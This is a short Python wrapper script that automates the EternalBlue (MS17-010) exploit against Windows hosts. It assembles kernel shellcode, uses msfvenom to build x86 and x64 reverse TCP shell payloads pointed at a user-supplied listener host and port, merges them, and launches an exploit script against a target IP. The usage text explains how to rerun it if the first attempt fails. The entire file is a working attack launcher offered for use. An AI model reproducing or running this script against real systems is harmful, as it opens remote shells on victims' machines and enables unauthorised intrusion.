import os, argparse

text = r"""
@credits:
Original GIT --> https://github.com/worawit/MS17-010"""

use = r"""
Make bins: python3 script.py -LH <Local-HOST> -LP <Listen-PORT>

Make bins and run exploit: python3 script.py -LH <Local-HOST> -LP <Listen-PORT> -t <Target-IP>

Only run exploit: python3 script.py -t <Target-IP>

If first running time the exploit fail, run again with only target"""

parser = argparse.ArgumentParser(description=text, usage=use)
parser.add_argument("-LH", "--LHOST", help="Your IP")
parser.add_argument("-LP", "--LPORT", help="Your PORT")
parser.add_argument("-t", "--target", help="Target")
args = parser.parse_args()
if args.LHOST and args.LPORT:
        os.system("rm *.bin > /dev/null")
        os.system("nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin && msfvenom -p windows/x64/shell_reverse_tcp LPORT="+args.LPORT+" LHOST="+args.LHOST+" --platform windows -a x64 --format raw -o sc_x64_payload.bin && cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin")
        os.system("nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin && msfvenom -p windows/shell_reverse_tcp LPORT="+args.LPORT+" LHOST="+args.LHOST+" --platform windows -a x86 --format raw -o sc_x86_payload.bin && cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin")
        os.system("python2 eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin")
if args.target:
        os.system("python2 eternalblue_exploit7.py "+args.target+" sc_all.bin")
